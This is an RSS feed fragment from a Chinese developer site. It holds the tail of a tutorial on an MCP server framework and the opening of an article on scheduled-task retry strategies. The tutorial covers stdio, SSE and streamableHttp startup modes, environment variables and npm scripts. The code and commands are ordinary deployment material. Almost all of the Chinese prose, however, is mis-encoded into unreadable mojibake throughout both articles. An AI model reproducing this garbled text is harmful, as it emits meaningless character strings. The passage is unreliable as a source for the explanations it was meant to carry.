   <span class="hljs-string">--</span> <span class="hljs-attr">mockFunc.ts:</span> <span class="hljs-string">æ¨¡æ‹Ÿä¸€ä¸ªå·¥å…·å†™æ³•</span> <span class="hljs-bullet">-</span> <span class="hljs-string">è¿™éƒ¨åˆ†éœ€è¦æ ¹æ®ä¸šåŠ¡å¼€å‘</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">cli.ts:</span> <span class="hljs-string">å‘½ä»¤è¡Œè§£æå·¥å…·</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">æ€»å…¥å£</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">server.ts:</span> <span class="hljs-string">åˆ›å»ºMcpæœåŠ¡</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">sse.ts:</span> <span class="hljs-string">è¿è¡Œsseæ¨¡å¼</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">stdio.ts:</span> <span class="hljs-string">è¿è¡Œstdioæ¨¡å¼</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">streamableHttp.ts:</span> <span class="hljs-string">è¿è¡ŒstreamableHttpæ¨¡å¼</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">xingyun/bin :</span> <span class="hljs-string">æ˜¯æ ¹æ®æˆ‘ä»¬ä¸šåŠ¡ä½¿ç”¨çš„éƒ¨ç½²å·¥å…·å¼€å‘çš„éƒ¨ç½²è„šæœ¬</span> <span class="hljs-bullet">-</span> <span class="hljs-string">è¿™éƒ¨åˆ†éœ€è¦æ ¹æ®å®é™…éƒ¨ç½²å¹³å°æ›´æ”¹ï¼Œæˆ‘è¿™ä¸ªæ”¯æŒè¡Œäº‘éƒ¨ç½²</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">build_xingyun.sh:</span> <span class="hljs-string">æ˜¯æ ¹æ®æˆ‘ä»¬ä¸šåŠ¡ä½¿ç”¨çš„éƒ¨ç½²å·¥å…·å¼€å‘çš„éƒ¨ç½²è„šæœ¬</span> <span class="hljs-bullet">-</span> <span class="hljs-string">è¿™éƒ¨åˆ†éœ€è¦æ ¹æ®å®é™…éƒ¨ç½²å¹³å°æ›´æ”¹ï¼Œæˆ‘è¿™ä¸ªæ”¯æŒè¡Œäº‘éƒ¨ç½²</span>
</code></pre>
<h3 data-id="heading-2">å¯åŠ¨æœåŠ¡æ–¹å¼</h3>
<p>a.æœ¬åœ°å¯åŠ¨</p>
<p>1.å¯åŠ¨stdio: npm run start æ˜¯é»˜è®¤å¯åŠ¨stdio</p>
<p>2.å¯åŠ¨StreamableHttp: npm run start:http æ˜¯é»˜è®¤å¯åŠ¨ç«¯å£3001</p>
<p>3.æ›´æ”¹ç«¯å£å¯åŠ¨StreamableHttp: npm run dev:http æˆ–è€… npm run start -- -t http -p 3001</p>
<p>-t httt: ä»£è¡¨å¯åŠ¨StreamableHttp</p>
<p>-p 3001: ä»£è¡¨å¯åŠ¨ç«¯å£3001</p>
<p>4.å¯åŠ¨sse: npm run start:sse æ˜¯é»˜è®¤å¯åŠ¨ç«¯å£3001</p>
<p>ï»¿</p>
<p>b.éƒ¨ç½²å¯åŠ¨</p>
<p>æˆ‘åœ¨ xingyun/bin/control.shä¸­å†™çš„å¯åŠ¨è„šæœ¬ï¼Œè¿™æ®µä»£ç æ˜¯å¯åŠ¨streamableHttplessçš„ï¼Œå¦‚æœéœ€è¦å¯åŠ¨sseï¼Œéœ€è¦æ”¹ä¸º <code>npm run start:sse</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">start</span>(<span class="hljs-params"/>){
    npm run <span class="hljs-attr">start</span>:http
    sleep <span class="hljs-number">3</span>
    status
}
</code></pre>
<h3 data-id="heading-3">ç”Ÿäº§ç¯å¢ƒé…ç½®</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ç›‘å¬ç‰¹å®šå†…ç½‘IPï¼ˆä¾‹å¦‚ï¼š192.168.1.100ï¼‰</span>
export <span class="hljs-attr">MCP_HOST</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span>
export <span class="hljs-attr">MCP_PORT</span>=<span class="hljs-number">3001</span>

<span class="hljs-comment"># ä½¿ç”¨å†…ç½‘åŸŸåï¼ˆå¯é€‰ï¼‰</span>
export <span class="hljs-attr">MCP_DOMAIN</span>=mcp-server.internal.com

<span class="hljs-comment"># ä¿®æ”¹åŸºç¡€è·¯å¾„ï¼ˆå¯é€‰ï¼Œé»˜è®¤æ˜¯ /mcpï¼‰</span>
export <span class="hljs-attr">MCP_BASE_PATH</span>=/api/mcp
</code></pre>

<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### ç«¯å£é…ç½®ä¼˜å…ˆçº§</span>
<span class="hljs-bullet">1.</span> ç¯å¢ƒå˜é‡ <span class="hljs-code">`MCP_PORT`</span>ï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰
<span class="hljs-bullet">2.</span> å‘½ä»¤è¡Œå‚æ•° <span class="hljs-code">`--port`</span> 
<span class="hljs-bullet">3.</span> é»˜è®¤å€¼ï¼š3001ç«¯å£

<span class="hljs-section">### è®¿é—®åœ°å€ä¼˜å…ˆçº§</span>
<span class="hljs-bullet">1.</span> ç¯å¢ƒå˜é‡ <span class="hljs-code">`MCP_DOMAIN`</span>ï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰
<span class="hljs-bullet">2.</span> ç¯å¢ƒå˜é‡ <span class="hljs-code">`MCP_HOST`</span>
<span class="hljs-bullet">3.</span> é»˜è®¤: localhost
</code></pre>

<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment">### å†…ç½‘è®¿é—®æ–¹å¼</span>
å‡è®¾ä½ çš„å†…ç½‘æœåŠ¡å™¨IPæ˜¯ <span class="hljs-string">`192.168.1.100`</span>ï¼Œç«¯å£æ˜¯ <span class="hljs-string">`3001`</span>ï¼š

**åŸºç¡€è®¿é—®ï¼š**
<span class="hljs-string">``</span><span class="hljs-string">`
http://192.168.1.100:3001/sales
`</span><span class="hljs-string">``</span>

**å¸¦åŸŸåçš„è®¿é—®ï¼š**
<span class="hljs-string">``</span><span class="hljs-string">`
http://mcp-server.internal.com/sales
`</span><span class="hljs-string">``</span>

**è‡ªå®šä¹‰è·¯å¾„ï¼š**
<span class="hljs-string">``</span><span class="hljs-string">`
http://192.168.1.100:3001/api/mcp
</span></code></pre>
<p>ï»¿</p>
<h2 data-id="heading-4">é¡¹ç›®å…³é”®ä»£ç è¯´æ˜</h2>
<p>è¿™ä¸ªæ˜¯package.jsonæ–‡ä»¶ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è¦çœ‹çš„ï¼Œ<code>cli.js</code>è¿™ä¸ªæ–‡ä»¶æ˜¯æˆ‘ä»¬å¯åŠ¨æ–‡ä»¶ï¼Œä¹Ÿæ˜¯è§£æå‘½ä»¤è¡Œçš„å·¥å…·ï¼ŒçœŸå®åŒºåˆ†çš„åœ°æ–¹åœ¨index.tsæ–‡ä»¶ä¸­</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-string">"scripts"</span>: {
    <span class="hljs-string">"build"</span>: <span class="hljs-string">"tsc &amp;&amp; chmod 755 build/src/index.js  build/src/cli.js"</span>,
    <span class="hljs-string">"start"</span>: <span class="hljs-string">"node ./build/src/cli.js"</span>,
    <span class="hljs-string">"start:http"</span>: <span class="hljs-string">"node ./build/src/cli.js --transport http"</span>,
    <span class="hljs-string">"start:sse"</span>: <span class="hljs-string">"node ./build/src/cli.js --transport sse"</span>,
    <span class="hljs-string">"dev:http"</span>: <span class="hljs-string">"node ./build/src/cli.js  --transport http --port 3002"</span>,
    <span class="hljs-string">"stop"</span>: <span class="hljs-string">"pkill -f "</span>demo<span class="hljs-string">" || true"</span>,
    <span class="hljs-string">"restart"</span>: <span class="hljs-string">"npm run stop &amp;&amp; npm run start:http"</span>,
    <span class="hljs-string">"inspector"</span>: <span class="hljs-string">"npx @modelcontextprotocol/inspector"</span>
  },
</code></pre>
<p>index.ts çš„å…³é”®ä»£ç ï¼Œåœ¨è¿™åŒºåˆ†ä¸åŒæ¨¡å¼ï¼Œç„¶åè¿›å…¥åˆ°å„è‡ªçš„å¤„ç†æ¨¡å—ã€‚å„è‡ªæ¨¡å—å°±æ˜¯è°ƒç”¨sdkï¼Œé…ç½®åŸŸåç­‰æ“ä½œï¼Œä»£ç è¿‡é•¿ï¼Œä¸å±•ç¤ºäº†ï¼Œä½†æ˜¯è¿™å‡ ä¸ªæ–‡ä»¶ä¸ç”¨åŠ¨ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2cb41c9ab1f43cb8003b7a55d2da5c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=64U%2F63owQPqDg1qCgGtuIPgfhxo%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>StreamableHttp.tsæˆ‘æ”¯æŒçš„æ˜¯lessï¼Œå°±æ˜¯æˆ‘ä¸éœ€è¦sessionIdï¼Œå¦‚æœæœ‰éœ€è¦çš„ï¼Œè¿™å—éœ€è¦å†è‡ªå·±æ”¹ä¸€ä¸‹ï¼ï¼</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58a67479b3744fc28cc4a9c8305cc833~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=k%2B243HbNiZoeP%2BqTorir43ZVMuc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>server.ts æ˜¯åˆ›å»ºmcpæœåŠ¡ï¼ŒåŒæ—¶æ³¨å†Œtoolså·¥å…·ï¼Œä¸‰ä¸ªæ¨¡å¼éƒ½éœ€è¦ä½¿ç”¨çš„å…¬å…±æ–‡ä»¶</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17c4017b136d43069edeba04b3594350~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=3eRQhTFVg%2B817b1%2BTCIUuYZ7SIo%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>tools/index.ts, ä½œä¸ºå·¥å…·å…¥å£ï¼Œä¸€ä¸ªå·¥å…·ä¸€ä¸ªæ³¨å†Œ</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b96c33a7fe4427cb0e3c145ff461fae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=rkr6hZiO51D5UWcGFAcXoGPfM2E%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>routeræ–‡ä»¶å¤¹ä¸‹è·¯ç”±æ³¨å†Œï¼Œæ˜¯ä¸ºäº†sseå’Œstreamablelessçš„è·¯ç”±ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a54b087acf6049cfa6e3270caab3c9a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=uqe0GB8Ka8nH8BAuauwi7Jvdkoc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>å…¶ä¸­streamableçš„index.tsæ–‡ä»¶é‡Œé¢å…³é”®å†…å®¹ï¼Œå…¶ä¸­basePathå°±æ˜¯ä½ çš„åŸºç¡€è·¯å¾„ï¼Œé€šè¿‡å®šä¹‰æŒ‡å®šè®¿é—®è·¯å¾„ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd93c0f813104a1fad1cc790fe568a3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=k6y2m1pt%2BY5OtJtRD6Xr2dZumuo%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>sseçš„åœ¨sse.tsæ–‡ä»¶ä¸­ï¼Œå®šä¹‰äº†getå’Œpostçš„æ–¹æ³•</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bce4f93d2304ef68d7ea0307a16deb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=%2BF9p0GfSAE%2BlA%2F%2FPKCRJhCLA3sI%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>å…¶å®æ•´ä¸ªæ¡†æ¶åˆ°è¿™å…³é”®çš„ä»£ç å°±è¯´å®Œäº†ã€‚å‰©ä¸‹xingyunçš„å°±æ˜¯åœ¨è¡Œäº‘å¹³å°éƒ¨ç½²å’Œå¯åŠ¨éœ€è¦çš„è„šæœ¬ï¼Œè¿™é‡Œå°±ä¸ä»‹ç»äº†</p>
<p>ï»¿</p>
<h2 data-id="heading-5">æˆæœå±•ç¤º</h2>
<p>1.stdio - å‘å¸ƒäº†ä¾èµ–åŒ…ï¼Œå¹¶ç”¨joycodeæˆåŠŸè”é€š</p>
<p>ï»¿<a href="https://link.juejin.cn?target=https%3A%2F%2Fnpm.m.jd.com%2Fpackage%2F%40jd%2Fdemo-mcp-server" target="_blank" title="https://npm.m.jd.com/package/@jd/demo-mcp-server" ref="nofollow noopener noreferrer">npm.m.jd.com/package/@jdâ€¦</a></p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9cb4ed9288f4487955473f6263efdbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=bKoQRbfKOBJbn32B1oc%2B97GQosU%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p>2.streamableHttp - joycodeæˆåŠŸè”é€šå¹¶ä¸”å¯ä»¥è¿è¡Œ</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a47fce5ada64429c95e69c6597fc5696~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=ViBE7J%2BGIxuuoov%2FBLibMU9RC6s%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62b6a24de7e2462c8272790aaf7f5dc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=ilvg5%2FGO6kt036zC86ep7k0GMBg%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p>3.sse - autobotsæ”¯æŒsseæ¨¡å¼ï¼Œç”¨è¿™ä¸ªæ¡†æ¶å¼€å‘äº†åœ¨ä¸šåŠ¡ä¸­ä½¿ç”¨çš„ æƒé™æ‹¦æˆªMCP,å¹¶æˆåŠŸåœ¨autobotså¼•å…¥</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/526475363b124af989347ad39e5701f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=EzHQP7aiJgSrbOounoWvrYzRrcc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fb4a980fd25441e9cad68d9f8781434~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=uZ1tb%2F%2F5ftQyrm6NlHRcDcHqHVw%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[618 å¤§ä¿ƒæŠ€æœ¯å®è·µï¼šå®šæ—¶ä»»åŠ¡å¼‚å¸¸é‡è¯•çš„æ¢ç´¢ä¸æ²‰æ·€]]></title>    <link>https://juejin.cn/post/7597642574933524489</link>    <guid>https://juejin.cn/post/7597642574933524489</guid>    <pubDate>2026-01-21T09:37:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597642574933524489" data-draft-id="7597623395907387438" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="618 å¤§ä¿ƒæŠ€æœ¯å®è·µï¼šå®šæ—¶ä»»åŠ¡å¼‚å¸¸é‡è¯•çš„æ¢ç´¢ä¸æ²‰æ·€â€‹"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-21T09:37:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            618 å¤§ä¿ƒæŠ€æœ¯å®è·µï¼šå®šæ—¶ä»»åŠ¡å¼‚å¸¸é‡è¯•çš„æ¢ç´¢ä¸æ²‰æ·€â€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:37:42.000Z" title="Wed Jan 21 2026 09:37:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šé½æµ·æ™º</p>
<p>åœ¨ 618 å¤§ä¿ƒçš„æŠ€æœ¯æˆ˜åœºä¸Šï¼Œæ¯ä¸€è¡Œä»£ç ã€æ¯ä¸€ä¸ªé…ç½®éƒ½å½±å“ç€ä¸€çº¿çš„å®å®åœ¨åœ¨çš„ä¸šåŠ¡ã€‚ä¸€æ¬¡çœ‹ä¼¼å¹³å¸¸çš„å‘ç‰ˆï¼Œå´æ„å¤–æš´éœ²äº†æˆ‘ä»¬ç³»ç»Ÿä¸­çš„å®šæ—¶ä»»åŠ¡ç®¡ç†çŸ­æ¿ï¼Œè¿™ä¿ƒä½¿æˆ‘ä»¬æ·±å…¥å‰–æåˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦ä¸­å¼‚å¸¸é‡è¯•æœºåˆ¶çš„æŠ€æœ¯ç»†èŠ‚ï¼Œå¹¶æœ€ç»ˆå°†å…¶è½¬åŒ–ä¸ºå®ˆæŠ¤ç³»ç»Ÿç¨³å®šæ€§çš„åšå›ºé˜²çº¿ã€‚â€‹</p>
<h2 data-id="heading-0">ä¸€ã€å¼‚å¸¸äº‹ä»¶å›æº¯ï¼šéšè—åœ¨å‘ç‰ˆèƒŒåçš„å®šæ—¶ç‚¸å¼¹â€‹</h2>
<p>å‘ç‰ˆæ¬¡æ—¥ï¼Œä¸šåŠ¡éƒ¨é—¨åé¦ˆå•†å®¶æœªæ”¶åˆ°é—¨åº—æ”¶è´§æ˜ç»†é‚®ä»¶ï¼Œå¯¼è‡´é—¨åº—æ”¶è´§ä¸šåŠ¡æ”¶åˆ°å½±å“ã€‚æŠ€æœ¯å›¢é˜Ÿè¿…é€Ÿå¯åŠ¨åº”æ€¥æµç¨‹ï¼Œé€šè¿‡å…¨é“¾è·¯æ—¥å¿—è¿½è¸ªå’Œç³»ç»ŸçŠ¶æ€åˆ†æï¼Œå‘ç°äº†é—®é¢˜çš„æ ¹æºæ˜¯ï¼šå‘ç‰ˆè¿‡ç¨‹ä¸­ï¼Œç”±äºæœåŠ¡é‡å¯ï¼Œä¸­æ–­äº†å®šæ—¶ä»»åŠ¡è¿›ç¨‹ï¼Œæ­£åœ¨æ‰§è¡Œçš„é‚®ä»¶å‘é€ä»»åŠ¡è¢«æ„å¤–ç»ˆæ­¢ã€‚è€Œè¯¥ä»»åŠ¡åœ¨ç®¡ç†å¹³å°ä¸Šå¹¶æœªé…ç½®ä»»ä½•é‡è¯•ç­–ç•¥ï¼Œä¸šåŠ¡ä»£ç ä¸Šä¹Ÿæ²¡æœ‰è¿›è¡Œç›¸å…³çš„æ£€æµ‹å’Œé‡è¯•ï¼Œè¿™å°±å¯¼è‡´ä»»åŠ¡å¤±è´¥åæ— æ³•è‡ªåŠ¨æ¢å¤æ‰§è¡Œï¼Œä¹Ÿæœªè¢«åŠæ—¶æ„ŸçŸ¥åˆ°ï¼Œè¿›è€Œå¼•å‘ä¸šåŠ¡é˜»æ–­ã€‚â€‹</p>
<p>ä¸ºè§£å†³ç‡ƒçœ‰ä¹‹æ€¥ï¼Œç ”å‘äººå‘˜ç«‹å³ç™»å½•ä»»åŠ¡ç®¡ç†å¹³å°ï¼Œæ‰‹å·¥è§¦å‘é‚®ä»¶å‘é€ä»»åŠ¡ï¼Œç¡®ä¿ä¸šåŠ¡åŠæ—¶æ¢å¤ã€‚ä½†è¿™æ¬¡äº‹ä»¶ç»™æˆ‘ä»¬æ•²å“äº†è­¦é’Ÿï¼šåœ¨åˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦åœºæ™¯ä¸‹ï¼Œé¢å¯¹ç½‘ç»œæŠ–åŠ¨ã€è¿›ç¨‹å¼‚å¸¸ç»ˆæ­¢ç­‰åœºæ™¯ï¼Œå¼‚å¸¸é‡è¯•æœºåˆ¶æ˜¯ä¿éšœä¸šåŠ¡å¯é æ€§çš„å…³é”®ã€‚â€‹</p>
<h2 data-id="heading-1">äºŒã€é‡è¯•ç­–ç•¥è®¾è®¡ï¼šä»ç†è®ºåˆ°ä»£ç çš„æ·±åº¦è§£æâ€‹</h2>
